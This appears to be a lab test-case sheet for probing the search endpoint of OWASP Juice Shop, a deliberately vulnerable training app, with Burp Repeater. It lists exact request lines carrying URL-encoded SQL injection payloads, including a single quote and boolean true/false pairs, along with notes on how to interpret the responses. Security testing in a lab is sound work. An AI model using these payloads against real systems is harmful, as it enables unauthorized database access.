# Burp Product Search Test Cases

Use Burp Repeater against `http://10.10.10.70` only. Keep the Host header
`Host: 10.10.10.70`. Replace the first request line in Raw view and send each
test once. Retain any required local headers privately; do not publish tokens.

| Test | Encoded q value | Observation to record |
|---|---|---|
| Normal search | `apple` | Status, product count, normal response |
| Single quote | `%27` | Status and body; error not guaranteed |
| Boolean true | `apple%25%27%29%29%20AND%201%3D1--%20` | Status and returned products |
| Boolean false | `apple%25%27%29%29%20AND%201%3D0--%20` | Status and returned products |

## Exact request lines

```http
GET /rest/products/search?q=apple HTTP/1.1
```

```http
GET /rest/products/search?q=%27 HTTP/1.1
```

```http
GET /rest/products/search?q=apple%25%27%29%29%20AND%201%3D1--%20 HTTP/1.1
```

```http
GET /rest/products/search?q=apple%25%27%29%29%20AND%201%3D0--%20 HTTP/1.1
```

The Boolean values decode to `apple%')) AND 1=1-- ` and
`apple%')) AND 1=0-- `. They target Juice Shop's interpolated LIKE query.
Expected vulnerable behavior is products for the true condition and an empty
array for the false condition, provided matching products exist and the deployed
query structure agrees. This expectation is not a recorded result.

Compare the pair using the same application state. The true condition comments
out remaining clauses, so its product count need not equal the normal search.
If both return identical results or errors, investigate before claiming success.
Check for double encoding (`%2527` instead of `%27`) and inspect the response
body rather than relying on the HTTP status alone.
